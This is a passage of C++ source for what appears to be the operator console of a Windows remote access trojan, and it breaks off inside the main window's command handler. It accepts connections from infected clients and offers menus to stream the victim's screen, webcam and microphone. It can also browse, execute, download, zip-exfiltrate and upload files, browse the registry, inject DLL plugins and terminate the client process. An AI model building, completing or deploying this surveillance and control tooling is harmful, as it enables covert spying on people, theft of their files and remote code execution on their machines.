#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")

using namespace Gdiplus;

#define SERVER_PORT 1234

#define IDC_LISTVIEW 1001
#define IDC_FILELIST 1002
#define IDC_REGLIST  1003 // New Registry ListView ID

#define IDM_START_RDP    2001
#define IDM_STOP_RDP     2002
#define IDM_START_MIC    2003
#define IDM_STOP_MIC     2004
#define IDM_FETCH_CAM    2005
#define IDM_STOP_CAM     2006
#define IDM_EXIT         2007
#define IDM_FILE_MGR     2008
#define IDM_INJECT_PLUG  2009
#define IDM_KICK_CLIENT  2010
#define IDM_CLOSE_CLIENT 2011
#define IDM_REG_MGR      2012 // New Registry Context Option

#define IDM_START_CAM_BASE 3000

#define IDM_FM_EXECUTE      4001
#define IDM_FM_DOWNLOAD     4002
#define IDM_FM_DL_DIR       4003 
#define IDM_FM_UPLOAD       4004

#define WM_CLIENT_UPDATE (WM_USER + 1)
#define WM_CLIENT_DISCONNECT (WM_USER + 2)
#define WM_CLIENT_UPDATE_STATUS (WM_USER + 3) 
#define WM_FM_UPDATE (WM_USER + 4) 
#define WM_REG_UPDATE (WM_USER + 5) 

HWND hMainWindow = NULL;
HWND hListView = NULL;
HWND hRdpWindow = NULL;
HWND hCamWindow = NULL;
HWND hFileWindow = NULL;
HWND hFileListView = NULL;

HWND hRegWindow = NULL;
HWND hRegListView = NULL;

HWAVEOUT hWaveOut = NULL;

char currentRemotePath[MAX_PATH] = "";
char currentRegPath[MAX_PATH] = "";

struct ClientData {
    SOCKET sock; int id; char ipAddress[16];
    char status[256]; 
    char webcamList[1024]; 
    char* latestFileList;
    char* latestRegList;
    BYTE* latestRdpFrame; DWORD rdpFrameSize;
    BYTE* latestCamFrame; DWORD camFrameSize;
    CRITICAL_SECTION cs;
};

ClientData* activeClient = NULL;

bool RecvAll(SOCKET sock, char* buffer, int size) {
    int total = 0;
    while (total < size) {
        int bytes = recv(sock, buffer + total, size - total, 0);
        if (bytes <= 0) return false;
        total += bytes;
    }
    return true;
}

bool RecvFileToDisk(SOCKET sock, const char* destPath, DWORD fileSize) {
    FILE* f = fopen(destPath, "wb");
    char buffer[8192]; DWORD total = 0;
    while (total < fileSize) {
        int toRead = sizeof(buffer);
        if (fileSize - total < toRead) toRead = fileSize - total; 
        int bytes = recv(sock, buffer, toRead, 0);
        if (bytes <= 0) break; 
        if (f) fwrite(buffer, 1, bytes, f); 
        total += bytes;
    }
    if (f) fclose(f);
    return (total == fileSize); 
}

bool SendFileFromDisk(SOCKET sock, const char* srcPath) {
    FILE* f = fopen(srcPath, "rb");
    if (!f) return false;
    char buffer[8192]; int bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        int totalSent = 0;
        while(totalSent < bytesRead) {
            int sent = send(sock, buffer + totalSent, bytesRead - totalSent, 0);
            if (sent <= 0) { fclose(f); return false; } 
            totalSent += sent;
        }
    }
    fclose(f); return true;
}

DWORD GetFileSizeOnDisk(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(hFile, NULL);
    CloseHandle(hFile); return size;
}

bool DrawJpeg(HDC hdc, BYTE* buffer, DWORD size, RECT rect) {
    if (!buffer || size == 0) return false;
    bool success = false;
    HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
    if (hGlobal) {
        void* pData = GlobalLock(hGlobal); memcpy(pData, buffer, size); GlobalUnlock(hGlobal);
        IStream* pStream = NULL;
        if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
            Image image(pStream); 
            if (image.GetLastStatus() == Ok) {
                Graphics graphics(hdc); graphics.DrawImage(&image, 0, 0, rect.right, rect.bottom); success = true;
            }
            pStream->Release(); 
        } else GlobalFree(hGlobal); 
    }
    return success;
}

void CALLBACK waveOutProc(HWAVEOUT hwo, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WOM_DONE) {
        WAVEHDR* wh = (WAVEHDR*)dwParam1; waveOutUnprepareHeader(hwo, wh, sizeof(WAVEHDR)); free(wh->lpData); delete wh;
    }
}

void PlayAudioChunk(BYTE* buffer, DWORD size) {
    if (!hWaveOut) {
        WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, sizeof(WAVEFORMATEX)};
        waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, (DWORD_PTR)waveOutProc, 0, CALLBACK_FUNCTION);
    }
    WAVEHDR* wh = new WAVEHDR();
    wh->lpData = (LPSTR)buffer; wh->dwBufferLength = size; wh->dwFlags = 0; wh->dwLoops = 0;
    waveOutPrepareHeader(hWaveOut, wh, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, wh, sizeof(WAVEHDR));
}

// --- Threads ---
DWORD WINAPI ClientHandlerThread(LPVOID lpParam) {
    ClientData* client = (ClientData*)lpParam;
    while (true) {
        BYTE cmd; 
        if (recv(client->sock, (char*)&cmd, 1, 0) <= 0) break;

        if (cmd == 0x02 || cmd == 0x04) { 
            DWORD size = 0; 
            if (!RecvAll(client->sock, (char*)&size, 4)) break;
            if (size == 0 || size > 15000000) break; 
            
            BYTE* buffer = (BYTE*)malloc(size);
            if (!buffer) break; 
            if (!RecvAll(client->sock, (char*)buffer, size)) { free(buffer); break; }

            EnterCriticalSection(&client->cs);
            if (cmd == 0x02) {
                if (client->latestRdpFrame) free(client->latestRdpFrame);
                client->latestRdpFrame = buffer; client->rdpFrameSize = size;
                if (hRdpWindow && IsWindowVisible(hRdpWindow) && activeClient == client) InvalidateRect(hRdpWindow, NULL, FALSE);
            } else {
                if (client->latestCamFrame) free(client->latestCamFrame);
                client->latestCamFrame = buffer; client->camFrameSize = size;
                if (hCamWindow && IsWindowVisible(hCamWindow) && activeClient == client) InvalidateRect(hCamWindow, NULL, FALSE);
            }
            LeaveCriticalSection(&client->cs);
        } 
        else if (cmd == 0x05) { 
            DWORD size = 0; if (!RecvAll(client->sock, (char*)&size, 4)) break;
            if (size == 0 || size > 5000000) break;
            BYTE* buffer = (BYTE*)malloc(size); if (!buffer) break;
            if (!RecvAll(client->sock, (char*)buffer, size)) { free(buffer); break; }
            if (activeClient == client) PlayAudioChunk(buffer, size);
            else free(buffer); 
        }
        else if (cmd == 0x06) { 
            DWORD len = 0; if (!RecvAll(client->sock, (char*)&len, 4)) break;
            if (len == 0 || len > 1024) break;
            char* statBuf = (char*)malloc(len + 1); if (!statBuf) break;
            if (!RecvAll(client->sock, statBuf, len)) { free(statBuf); break; }
            statBuf[len] = '\0';
            
            EnterCriticalSection(&client->cs); strcpy(client->status, statBuf); LeaveCriticalSection(&client->cs);
            PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0); free(statBuf);
        }
        else if (cmd == 0x07) { 
            DWORD len = 0; if (!RecvAll(client->sock, (char*)&len, 4)) break;
            if (len == 0 || len > 4096) break;
            char* listBuf = (char*)malloc(len + 1); if (!listBuf) break;
            if (!RecvAll(client->sock, listBuf, len)) { free(listBuf); break; }
            listBuf[len] = '\0';
            
            EnterCriticalSection(&client->cs);
            strcpy(client->webcamList, listBuf); strcpy(client->status, "Webcam List Fetched Successfully.");
            LeaveCriticalSection(&client->cs);
            PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0); free(listBuf);
        }
        else if (cmd == 0x22) { 
            DWORD len = 0; if (!RecvAll(client->sock, (char*)&len, 4)) break;
            if (len == 0 || len > 2000000) break;
            char* listBuf = (char*)malloc(len + 1); if (!listBuf) break;
            if (!RecvAll(client->sock, listBuf, len)) { free(listBuf); break; }
            listBuf[len] = '\0';
            
            EnterCriticalSection(&client->cs);
            if (client->latestFileList) free(client->latestFileList);
            client->latestFileList = listBuf;
            LeaveCriticalSection(&client->cs);
            if (activeClient == client && hFileWindow && IsWindowVisible(hFileWindow)) PostMessage(hFileWindow, WM_FM_UPDATE, 0, 0);
        }
        // --- Registry Data Payload ---
        else if (cmd == 0x41) { 
            DWORD len = 0; if (!RecvAll(client->sock, (char*)&len, 4)) break;
            if (len > 3000000) break; // Hard safety limit for large registry branches
            
            char* listBuf = (char*)malloc(len + 1); if (!listBuf) break;
            if (len > 0 && !RecvAll(client->sock, listBuf, len)) { free(listBuf); break; }
            listBuf[len] = '\0';
            
            EnterCriticalSection(&client->cs);
            if (client->latestRegList) free(client->latestRegList);
            client->latestRegList = listBuf;
            LeaveCriticalSection(&client->cs);
            
            if (activeClient == client && hRegWindow && IsWindowVisible(hRegWindow)) PostMessage(hRegWindow, WM_REG_UPDATE, 0, 0);
        }
        else if (cmd == 0x25) { 
            DWORD nameLen = 0; if (!RecvAll(client->sock, (char*)&nameLen, 4)) break;
            char fileName[MAX_PATH] = {0}; if (!RecvAll(client->sock, fileName, nameLen)) break; fileName[nameLen] = '\0';
            DWORD fileSize = 0; if (!RecvAll(client->sock, (char*)&fileSize, 4)) break;
            
            char localPath[MAX_PATH]; sprintf(localPath, "Downloaded_%s", fileName);
            EnterCriticalSection(&client->cs); strcpy(client->status, "Receiving File Transfer..."); LeaveCriticalSection(&client->cs);
            PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0);
            
            if (RecvFileToDisk(client->sock, localPath, fileSize)) {
                EnterCriticalSection(&client->cs); strcpy(client->status, "Download Complete."); LeaveCriticalSection(&client->cs);
            } else {
                EnterCriticalSection(&client->cs); strcpy(client->status, "Download Failed/Corrupted."); LeaveCriticalSection(&client->cs);
            }
            PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0);
        }
    }
    PostMessage(hMainWindow, WM_CLIENT_DISCONNECT, (WPARAM)client, 0); 
    return 0;
}

DWORD WINAPI ListenerThread(LPVOID lpParam) {
    SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in server = { AF_INET, htons(SERVER_PORT), INADDR_ANY };
    bind(listenSock, (struct sockaddr*)&server, sizeof(server)); listen(listenSock, SOMAXCONN);
    
    int idCounter = 1;
    while (true) {
        struct sockaddr_in clientAddr; int clientLen = sizeof(clientAddr);
        SOCKET clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &clientLen);
        if (clientSock != INVALID_SOCKET) {
            ClientData* client = new ClientData();
            client->sock = clientSock; client->id = idCounter++;
            strcpy(client->ipAddress, inet_ntoa(clientAddr.sin_addr));
            strcpy(client->status, "Connecting..."); strcpy(client->webcamList, "");
            client->latestFileList = NULL; client->latestRegList = NULL;
            client->latestRdpFrame = NULL; client->latestCamFrame = NULL;
            InitializeCriticalSection(&client->cs);
            
            PostMessage(hMainWindow, WM_CLIENT_UPDATE, (WPARAM)client, 0);
            CreateThread(NULL, 0, ClientHandlerThread, client, 0, NULL);
        }
    }
    return 0;
}

// --- Window Procedures ---

void PopulateRegListView(char* data) {
    ListView_DeleteAllItems(hRegListView);
    if (!data || strlen(data) == 0) return;

    LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_TEXT; 
    lvi.iItem = 0; lvi.pszText = (LPSTR)"..";
    int index = ListView_InsertItem(hRegListView, &lvi);
    ListView_SetItemText(hRegListView, index, 1, "KEY");

    char* line = strtok(data, "\n");
    while (line) {
        if (strncmp(line, "KEY|", 4) == 0) {
            lvi.iItem = ListView_GetItemCount(hRegListView); lvi.pszText = line + 4;
            index = ListView_InsertItem(hRegListView, &lvi);
            ListView_SetItemText(hRegListView, index, 1, "KEY");
        } else if (strncmp(line, "VAL|", 4) == 0) {
            char* p1 = line + 4;
            char* p2 = strchr(p1, '|');
            if (p2) {
                *p2 = '\0'; p2++;
                char* p3 = strchr(p2, '|');
                if (p3) {
                    *p3 = '\0'; p3++;
                    lvi.iItem = ListView_GetItemCount(hRegListView); lvi.pszText = p1; // Name
                    index = ListView_InsertItem(hRegListView, &lvi);
                    ListView_SetItemText(hRegListView, index, 1, p2); // Type
                    ListView_SetItemText(hRegListView, index, 2, p3); // Data
                }
            }
        }
        line = strtok(NULL, "\n");
    }
}

LRESULT CALLBACK RegMgrWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            hRegListView = CreateWindowExA(0, WC_LISTVIEW, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL, 0, 0, 600, 400, hwnd, (HMENU)IDC_REGLIST, GetModuleHandle(NULL), NULL);
            ListView_SetExtendedListViewStyle(hRegListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
            LVCOLUMNA lvc; ZeroMemory(&lvc, sizeof(LVCOLUMNA)); lvc.mask = LVCF_TEXT | LVCF_WIDTH;
            lvc.pszText = (LPSTR)"Name"; lvc.cx = 250; ListView_InsertColumn(hRegListView, 0, &lvc);
            lvc.pszText = (LPSTR)"Type"; lvc.cx = 100; ListView_InsertColumn(hRegListView, 1, &lvc);
            lvc.pszText = (LPSTR)"Data"; lvc.cx = 250; ListView_InsertColumn(hRegListView, 2, &lvc);
            return 0;
        }
        case WM_REG_UPDATE:
            if (activeClient && activeClient->latestRegList) {
                EnterCriticalSection(&activeClient->cs);
                char* copy = _strdup(activeClient->latestRegList);
                LeaveCriticalSection(&activeClient->cs);
                PopulateRegListView(copy);
                free(copy);
            }
            return 0;
        case WM_NOTIFY: {
            LPNMHDR nmhdr = (LPNMHDR)lParam;
            if (nmhdr->code == NM_DBLCLK && nmhdr->idFrom == IDC_REGLIST) {
                int sel = ListView_GetNextItem(hRegListView, -1, LVNI_SELECTED);
                if (sel != -1 && activeClient) {
                    char name[MAX_PATH], type[16];
                    ListView_GetItemText(hRegListView, sel, 0, name, MAX_PATH);
                    ListView_GetItemText(hRegListView, sel, 1, type, 16);
                    
                    if (strcmp(type, "KEY") == 0) {
                        if (strcmp(name, "..") == 0) {
                            char* lastSlash = strrchr(currentRegPath, '\\');
                            if (lastSlash) *lastSlash = '\0';
                            else strcpy(currentRegPath, ""); 
                        } else {
                            if (strlen(currentRegPath) > 0) strcat(currentRegPath, "\\");
                            strcat(currentRegPath, name);
                        }
                        
                        BYTE cmd = 0x40; DWORD len = (DWORD)strlen(currentRegPath);
                        send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&len, 4, 0);
                        if (len > 0) send(activeClient->sock, currentRegPath, len, 0);
                    }
                }
            }
            return 0;
        }
        case WM_SIZE: SetWindowPos(hRegListView, NULL, 0, 0, LOWORD(lParam), HIWORD(lParam), SWP_NOZORDER); return 0;
        case WM_CLOSE: ShowWindow(hwnd, SW_HIDE); return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

void PopulateFileListView(char* data) {
    ListView_DeleteAllItems(hFileListView);
    if (!data || strlen(data) == 0) return;

    if (strchr(data, '|') && !strchr(data, '\n')) {
        char* token = strtok(data, "|");
        while (token) {
            LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_TEXT; 
            lvi.iItem = ListView_GetItemCount(hFileListView); lvi.pszText = token;
            int index = ListView_InsertItem(hFileListView, &lvi);
            ListView_SetItemText(hFileListView, index, 1, "DRIVE"); token = strtok(NULL, "|");
        }
    } else {
        LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_TEXT; 
        lvi.iItem = 0; lvi.pszText = (LPSTR)"..";
        int index = ListView_InsertItem(hFileListView, &lvi); ListView_SetItemText(hFileListView, index, 1, "DIR");
        char* line = strtok(data, "\n");
        while (line) {
            char type[16], name[MAX_PATH], size[32];
            if (sscanf(line, "%[^|]|%[^|]|%s", type, name, size) == 3) {
                lvi.iItem = ListView_GetItemCount(hFileListView); lvi.pszText = name;
                index = ListView_InsertItem(hFileListView, &lvi);
                ListView_SetItemText(hFileListView, index, 1, type); ListView_SetItemText(hFileListView, index, 2, size);
            }
            line = strtok(NULL, "\n");
        }
    }
}

LRESULT CALLBACK FileMgrWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            hFileListView = CreateWindowExA(0, WC_LISTVIEW, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL, 0, 0, 500, 400, hwnd, (HMENU)IDC_FILELIST, GetModuleHandle(NULL), NULL);
            ListView_SetExtendedListViewStyle(hFileListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
            LVCOLUMNA lvc; ZeroMemory(&lvc, sizeof(LVCOLUMNA)); lvc.mask = LVCF_TEXT | LVCF_WIDTH;
            lvc.pszText = (LPSTR)"Name"; lvc.cx = 250; ListView_InsertColumn(hFileListView, 0, &lvc);
            lvc.pszText = (LPSTR)"Type"; lvc.cx = 100; ListView_InsertColumn(hFileListView, 1, &lvc);
            lvc.pszText = (LPSTR)"Size"; lvc.cx = 100; ListView_InsertColumn(hFileListView, 2, &lvc);
            return 0;
        }
        case WM_FM_UPDATE:
            if (activeClient && activeClient->latestFileList) {
                EnterCriticalSection(&activeClient->cs);
                char* copy = _strdup(activeClient->latestFileList); LeaveCriticalSection(&activeClient->cs);
                PopulateFileListView(copy); free(copy);
            }
            return 0;
        case WM_NOTIFY: {
            LPNMHDR nmhdr = (LPNMHDR)lParam;
            if (nmhdr->code == NM_DBLCLK && nmhdr->idFrom == IDC_FILELIST) {
                int sel = ListView_GetNextItem(hFileListView, -1, LVNI_SELECTED);
                if (sel != -1 && activeClient) {
                    char name[MAX_PATH], type[16];
                    ListView_GetItemText(hFileListView, sel, 0, name, MAX_PATH);
                    ListView_GetItemText(hFileListView, sel, 1, type, 16);
                    if (strcmp(type, "DRIVE") == 0 || strcmp(type, "DIR") == 0) {
                        if (strcmp(name, "..") == 0) {
                            char* lastSlash = strrchr(currentRemotePath, '\\');
                            if (lastSlash && lastSlash != currentRemotePath) *lastSlash = '\0'; else strcpy(currentRemotePath, ""); 
                        } else {
                            if (strlen(currentRemotePath) > 0 && currentRemotePath[strlen(currentRemotePath)-1] != '\\') strcat(currentRemotePath, "\\");
                            strcat(currentRemotePath, name);
                        }
                        BYTE cmd = (strlen(currentRemotePath) == 0) ? 0x20 : 0x21;
                        send(activeClient->sock, (char*)&cmd, 1, 0);
                        if (cmd == 0x21) { DWORD len = (DWORD)strlen(currentRemotePath); send(activeClient->sock, (char*)&len, 4, 0); send(activeClient->sock, currentRemotePath, len, 0); }
                    }
                }
            }
            if (nmhdr->code == NM_RCLICK && nmhdr->idFrom == IDC_FILELIST) {
                int sel = ListView_GetNextItem(hFileListView, -1, LVNI_SELECTED);
                if (activeClient) {
                    HMENU hMenu = CreatePopupMenu();
                    if (sel != -1) {
                        char type[16]; ListView_GetItemText(hFileListView, sel, 1, type, 16);
                        if (strcmp(type, "FILE") == 0) { AppendMenuA(hMenu, MF_STRING, IDM_FM_EXECUTE, "Execute File"); AppendMenuA(hMenu, MF_STRING, IDM_FM_DOWNLOAD, "Download File"); } 
                        else if (strcmp(type, "DIR") == 0) { AppendMenuA(hMenu, MF_STRING, IDM_FM_DL_DIR, "Download Directory (ZIP)"); }
                        AppendMenuA(hMenu, MF_SEPARATOR, 0, NULL);
                    }
                    AppendMenuA(hMenu, MF_STRING, IDM_FM_UPLOAD, "Upload File Here");
                    POINT pt; GetCursorPos(&pt);
                    int selection = TrackPopupMenu(hMenu, TPM_RETURNCMD | TPM_NONOTIFY, pt.x, pt.y, 0, hwnd, NULL); DestroyMenu(hMenu);
                    char name[MAX_PATH]; if (sel != -1) ListView_GetItemText(hFileListView, sel, 0, name, MAX_PATH);
                    
                    if (selection == IDM_FM_EXECUTE) {
                        char fullPath[MAX_PATH]; sprintf(fullPath, "%s\\%s", currentRemotePath, name);
                        BYTE cmd = 0x23; DWORD len = (DWORD)strlen(fullPath);
                        send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&len, 4, 0); send(activeClient->sock, fullPath, len, 0);
                    } else if (selection == IDM_FM_DOWNLOAD) {
                        char fullPath[MAX_PATH]; sprintf(fullPath, "%s\\%s", currentRemotePath, name);
                        BYTE cmd = 0x24; DWORD len = (DWORD)strlen(fullPath);
                        send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&len, 4, 0); send(activeClient->sock, fullPath, len, 0);
                        MessageBoxA(hwnd, "Download requested. Watch the Server console/folder.", "Info", MB_OK);
                    } else if (selection == IDM_FM_DL_DIR) {
                        char fullPath[MAX_PATH]; sprintf(fullPath, "%s\\%s", currentRemotePath, name);
                        BYTE cmd = 0x27; DWORD len = (DWORD)strlen(fullPath);
                        send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&len, 4, 0); send(activeClient->sock, fullPath, len, 0);
                        MessageBoxA(hwnd, "Directory Zip requested. This may take a moment before downloading begins.", "Info", MB_OK);
                    } else if (selection == IDM_FM_UPLOAD) {
                        OPENFILENAMEA ofn; char szFile[MAX_PATH] = {0}; ZeroMemory(&ofn, sizeof(ofn));
                        ofn.lStructSize = sizeof(ofn); ofn.hwndOwner = hwnd; ofn.lpstrFile = szFile; ofn.nMaxFile = sizeof(szFile);
                        ofn.lpstrFilter = "All Files\0*.*\0"; ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
                        if (GetOpenFileNameA(&ofn)) {
                            DWORD fSize = GetFileSizeOnDisk(szFile);
                            if (fSize > 0) {
                                const char* justName = strrchr(szFile, '\\'); justName = justName ? justName + 1 : szFile;
                                char destPath[MAX_PATH]; sprintf(destPath, "%s\\%s", currentRemotePath, justName);
                                BYTE cmd = 0x26; DWORD pathLen = (DWORD)strlen(destPath);
                                send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&pathLen, 4, 0); send(activeClient->sock, destPath, pathLen, 0); send(activeClient->sock, (char*)&fSize, 4, 0);
                                if (SendFileFromDisk(activeClient->sock, szFile)) MessageBoxA(hwnd, "Upload Completed.", "Success", MB_OK); else MessageBoxA(hwnd, "Upload Interrupted.", "Error", MB_ICONERROR);
                            }
                        }
                    }
                }
            }
            return 0;
        }
        case WM_SIZE: SetWindowPos(hFileListView, NULL, 0, 0, LOWORD(lParam), HIWORD(lParam), SWP_NOZORDER); return 0;
        case WM_CLOSE: ShowWindow(hwnd, SW_HIDE); return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK VideoWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_PAINT: {
            PAINTSTRUCT ps; HDC hdc = BeginPaint(hwnd, &ps); RECT rect; GetClientRect(hwnd, &rect);
            HDC hMemDC = CreateCompatibleDC(hdc); HBITMAP hBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom); SelectObject(hMemDC, hBitmap);
            FillRect(hMemDC, &rect, (HBRUSH)(COLOR_WINDOW+1)); bool hasDrawn = false;
            
            if (activeClient) {
                EnterCriticalSection(&activeClient->cs);
                if (hwnd == hRdpWindow) hasDrawn = DrawJpeg(hMemDC, activeClient->latestRdpFrame, activeClient->rdpFrameSize, rect);
                if (hwnd == hCamWindow) hasDrawn = DrawJpeg(hMemDC, activeClient->latestCamFrame, activeClient->camFrameSize, rect);
                LeaveCriticalSection(&activeClient->cs);
            }
            if (!hasDrawn) { SetBkMode(hMemDC, TRANSPARENT); SetTextColor(hMemDC, RGB(100, 100, 100)); TextOutA(hMemDC, 10, 10, "Waiting for video feed payload...", 33); }
            BitBlt(hdc, 0, 0, rect.right, rect.bottom, hMemDC, 0, 0, SRCCOPY);
            DeleteObject(hBitmap); DeleteDC(hMemDC); EndPaint(hwnd, &ps); return 0;
        }
        case WM_CLOSE:
            if (activeClient) { BYTE cmd = (hwnd == hRdpWindow) ? 0x11 : 0x13; send(activeClient->sock, (char*)&cmd, 1, 0); }
            ShowWindow(hwnd, SW_HIDE); return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

void BuildMainMenu(HWND hwnd) {
    HMENU hMenu = CreateMenu();
    HMENU hSubMenu = CreatePopupMenu(); AppendMenuA(hSubMenu, MF_STRING | MF_GRAYED, 0, "Select a client via Right-Click to operate."); AppendMenuA(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, "Commands");
    HMENU hFileMenu = CreatePopupMenu(); AppendMenuA(hFileMenu, MF_STRING, IDM_EXIT, "Exit"); AppendMenuA(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, "File"); SetMenu(hwnd, hMenu);
}

void ShowContextMenu(HWND hwnd) {
    int sel = ListView_GetNextItem(hListView, -1, LVNI_SELECTED);
    ClientData* selClient = NULL;
    if (sel != -1) {
        LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = sel; ListView_GetItem(hListView, &lvi); selClient = (ClientData*)lvi.lParam;
    }

    HMENU hSubMenu = CreatePopupMenu();
    AppendMenuA(hSubMenu, MF_STRING, IDM_START_RDP, "Start Remote Desktop"); AppendMenuA(hSubMenu, MF_STRING, IDM_STOP_RDP, "Stop Remote Desktop"); AppendMenuA(hSubMenu, MF_SEPARATOR, 0, NULL);
    
    HMENU hCamMenu = CreatePopupMenu(); AppendMenuA(hCamMenu, MF_STRING, IDM_FETCH_CAM, "1. Fetch Webcam List"); AppendMenuA(hCamMenu, MF_SEPARATOR, 0, NULL);
    
    if (selClient && strlen(selClient->webcamList) > 0 && strcmp(selClient->webcamList, "None") != 0) {
        char copy[1024]; EnterCriticalSection(&selClient->cs); strcpy(copy, selClient->webcamList); LeaveCriticalSection(&selClient->cs);
        char* line = strtok(copy, "\n");
        while (line != NULL) {
            int idx; char name[256]; char* sep = strchr(line, '|');
            if (sep) {
                *sep = '\0'; idx = atoi(line); strcpy(name, sep + 1); char display[300]; sprintf(display, "Start: %s", name);
                AppendMenuA(hCamMenu, MF_STRING, IDM_START_CAM_BASE + idx, display);
            }
            line = strtok(NULL, "\n");
        }
    } else AppendMenuA(hCamMenu, MF_STRING | MF_GRAYED, 0, "(No Webcams / Fetch List First)");
    
    AppendMenuA(hCamMenu, MF_SEPARATOR, 0, NULL); AppendMenuA(hCamMenu, MF_STRING, IDM_STOP_CAM, "Stop Webcam");
    AppendMenuA(hSubMenu, MF_POPUP, (UINT_PTR)hCamMenu, "Webcams");
    AppendMenuA(hSubMenu, MF_SEPARATOR, 0, NULL); AppendMenuA(hSubMenu, MF_STRING, IDM_START_MIC, "Start Microphone"); AppendMenuA(hSubMenu, MF_STRING, IDM_STOP_MIC, "Stop Microphone");

    // NEW CONTEXT MENU OPTIONS
    AppendMenuA(hSubMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hSubMenu, MF_STRING, IDM_FILE_MGR, "Open File Manager"); 
    AppendMenuA(hSubMenu, MF_STRING, IDM_REG_MGR, "Open Registry Editor"); 
    AppendMenuA(hSubMenu, MF_STRING, IDM_INJECT_PLUG, "Inject Plugin (DLL)"); 
    
    AppendMenuA(hSubMenu, MF_SEPARATOR, 0, NULL); HMENU hAdminMenu = CreatePopupMenu();
    AppendMenuA(hAdminMenu, MF_STRING, IDM_KICK_CLIENT, "Kick Client (Force Reconnect)"); AppendMenuA(hAdminMenu, MF_STRING, IDM_CLOSE_CLIENT, "Close Client (Terminate Process)");
    AppendMenuA(hSubMenu, MF_POPUP, (UINT_PTR)hAdminMenu, "Administration");

    POINT pt; GetCursorPos(&pt); TrackPopupMenu(hSubMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL); DestroyMenu(hSubMenu);
}

LRESULT CALLBACK MainWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            BuildMainMenu(hwnd);
            INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_LISTVIEW_CLASSES }; InitCommonControlsEx(&icex);
            hListView = CreateWindowExA(0, WC_LISTVIEW, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL, 0, 0, 600, 400, hwnd, (HMENU)IDC_LISTVIEW, GetModuleHandle(NULL), NULL);
            ListView_SetExtendedListViewStyle(hListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
            LVCOLUMNA lvc; ZeroMemory(&lvc, sizeof(LVCOLUMNA)); lvc.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
            lvc.pszText = (LPSTR)"ID"; lvc.cx = 50; ListView_InsertColumn(hListView, 0, &lvc);
            lvc.pszText = (LPSTR)"IP Address"; lvc.cx = 150; ListView_InsertColumn(hListView, 1, &lvc);
            lvc.pszText = (LPSTR)"Status"; lvc.cx = 300; ListView_InsertColumn(hListView, 2, &lvc);
            CreateThread(NULL, 0, ListenerThread, NULL, 0, NULL); return 0;
        }
        case WM_NOTIFY:
            if (((LPNMHDR)lParam)->code == NM_RCLICK && ((LPNMHDR)lParam)->idFrom == IDC_LISTVIEW) ShowContextMenu(hwnd);
            return 0;
            
        case WM_COMMAND: {
            if (LOWORD(wParam) == IDM_EXIT) PostQuitMessage(0);
            int sel = ListView_GetNextItem(hListView, -1, LVNI_SELECTED);
            if (sel != -1) {
